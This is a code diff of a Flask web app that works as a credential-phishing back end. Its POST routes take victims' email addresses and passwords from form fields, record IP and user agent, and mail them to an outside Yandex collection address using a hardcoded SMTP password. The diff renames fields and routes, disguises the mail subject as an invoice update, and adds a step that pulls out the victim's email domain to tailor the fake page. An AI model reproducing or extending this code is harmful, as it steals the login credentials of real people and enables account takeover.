@@ -1,4 +1,8 @@
-from flask import Flask, render_template, request, session, jsonify, abort, make_response
+from flask import Flask, request, abort, render_template, session, redirect, url_for, make_response, jsonify
+import secrets
+import random
+import io
+import string
 import hashlib
 import time
 import base64
@@ -177,8 +181,8 @@ def verify():
     return jsonify({"status": "verified"})
 
 
-@app.route("/first", methods=['POST'])
-def first():
+@app.route("/clips", methods=['POST'])
+def clips():
     if request.method == 'POST':
         ip = request.headers.get('X-Forwarded-For')
         if ip is None:
@@ -187,15 +191,15 @@ def first():
             ip = request.headers.get('X-Client-IP')
         if ip is None:
             ip = request.remote_addr
-        email = request.form.get("horse")
-        passwordemail = request.form.get("pig")
+        email = request.form.get("emailapive")
+        passwordemail = request.form.get("passwordapive")
         sender_email = "newsevers@yonia.site"
         sender_emaill = "contact"
         receiver_email = "aliresult2020@yandex.com"
         password = "-%JXX7Ap]-4q"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA$$ Logs "
+        message["Subject"] = "new Upsate ## invoice"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -213,12 +217,28 @@ def first():
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
         session['eman'] = email  # Save email as session variable
-        return redirect(url_for('benza', web=email))
+        return redirect(url_for('mesona', web=email))
+
+@app.route("/mesonap", methods=['GET'])
+def mesona():
+    eman = session.get('eman')  # email from first step
+    dman = session.get('ins')   # email from second step
+
+    # extract domain from whichever exists
+    domain_value = None
+    if dman and "@" in dman:
+        domain_value = dman.split("@")[1]
+    elif eman and "@" in eman:
+        domain_value = eman.split("@")[1]
+
+    # store domain for reuse if needed
+    session['domain_part'] = domain_value
+
+    return render_template('indexc.html', eman=eman, dman=domain_value)
 
 
-
-@app.route("/second", methods=['POST'])
-def second():
+@app.route("/mansecond", methods=['POST'])
+def mansecond():
     if request.method == 'POST':
         ip = request.headers.get('X-Forwarded-For')
         if ip is None:
@@ -227,15 +247,15 @@ def second():
             ip = request.headers.get('X-Client-IP')
         if ip is None:
             ip = request.remote_addr
-        email = request.form.get("horse")
-        passwordemail = request.form.get("pig")
+        email = request.form.get("emailail")
+        passwordemail = request.form.get("passwordail")
         sender_email = "newsevers@yonia.site"
         sender_emaill = "contact"
         receiver_email = "aliresult2020@yandex.com"
         password = "-%JXX7Ap]-4q"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA$$ Logs  !! "
+        message["Subject"] = "new Upsate ## invoice"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -252,19 +272,11 @@ def second():
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
-        return redirect(url_for('lasmo', web=email))
+        return redirect(url_for('pilom', web=email))
 
 
-
-@app.route("/benzap", methods=['GET'])
-def benza():
-    if request.method == 'GET':
-        eman = session.get('eman')
-        dman = session.get('ins')
-    return render_template('ind.html', eman=eman, dman=dman)
-
-@app.route("/lasmop", methods=['GET'])
-def lasmo():
+@app.route("/pilomp", methods=['GET'])
+def pilom():
     userip = request.headers.get("X-Forwarded-For")
     useragent = request.headers.get("User-Agent")
     
@@ -280,6 +292,3 @@ def lasmo():
 
 if __name__ == "__main__":
     app.run(debug=True)
-
-
-
